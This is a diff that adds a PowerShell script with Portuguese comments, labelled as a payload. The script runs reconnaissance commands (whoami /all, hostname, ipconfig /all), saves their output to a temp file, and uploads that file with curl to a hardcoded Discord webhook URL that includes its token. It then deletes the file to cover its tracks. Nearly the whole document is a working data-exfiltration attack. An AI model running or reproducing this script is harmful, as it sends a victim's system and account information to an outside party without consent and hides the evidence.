@@ -1,0 +1,20 @@
+# PAYLOAD (.ps1) - ICMP Timing Adapt (Discord Version)
+$u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
+
+# 1. Definição do Comando (Baseado no #SYSTEM_COMMAND original)
+$cmd = "whoami /all; hostname; ipconfig /all"
+
+# 2. Execução e Captura de Output
+$output = Invoke-Expression $cmd | Out-String
+
+# 3. Guardar temporariamente para exfiltração
+$f = "$env:TEMP\sys_recon.txt"
+$output | Out-File -FilePath $f -Encoding ascii
+
+# 4. Notificação e Upload para Discord
+curl.exe -k -s -F ('payload=' + [char]64 + 'Reconhecimento concluido no host: ' + $env:COMPUTERNAME) $u
+curl.exe -k -s -F ('file=' + [char]64 + $f) $u
+
+# Limpeza e fecho
+Remove-Item $f
+exit
